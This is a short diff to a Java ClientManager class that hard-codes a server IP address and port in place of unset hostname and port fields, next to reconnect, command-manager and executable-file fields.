@@ -21,8 +21,8 @@ public class ClientManager {
     static int RECONNECT_TIMEOUT = 2000; //millis
 
     Iterator<String> it;
-    String hostname;
-    int port;
+    String hostname = "188.242.233.237";
+    int port = 25947;
     CommandManager commandManager;
     Set<String> executableFiles = new HashSet<String>();
     boolean fileNotEmpty = true;
